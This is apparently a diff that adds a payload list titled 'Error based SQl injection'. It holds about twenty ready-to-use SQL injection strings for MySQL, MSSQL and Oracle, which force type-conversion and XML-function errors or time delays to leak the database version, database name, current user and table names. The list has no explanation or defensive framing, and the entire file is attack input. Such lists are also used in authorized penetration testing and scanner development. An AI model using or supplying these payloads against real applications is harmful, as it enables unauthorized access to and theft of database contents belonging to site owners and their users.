@@ -1,0 +1,22 @@
+Error based SQl injection :~
+
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CAST((SELECT database()) AS int)--
+' AND (SELECT 1/0)--
+' AND (SELECT COUNT(*) FROM non_existing_table)--
+' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
+' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--
+' AND 1=benchmark(5000000,MD5(1))--
+' AND 1=exp(~0)--
+' AND FLOOR(1/0)--
+' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
+' AND (SELECT name FROM sysobjects WHERE xtype='U')--
+' AND convert(int,db_name())=1--
+' AND (SELECT count(*) FROM sysobjects) > 0--
+' AND 1=convert(int,db_name())--
+' AND to_number('text')=1--
+' AND 1=utl_inaddr.get_host_name('127.0.0.1')--
+' AND 1=TO_NUMBER('ABCD')--
+' AND (SELECT @@servername) > 0--
+' AND DECODE(1,1,(SELECT user FROM dual),0)--
+' AND (SELECT CAST(name AS int) FROM sysobjects)--
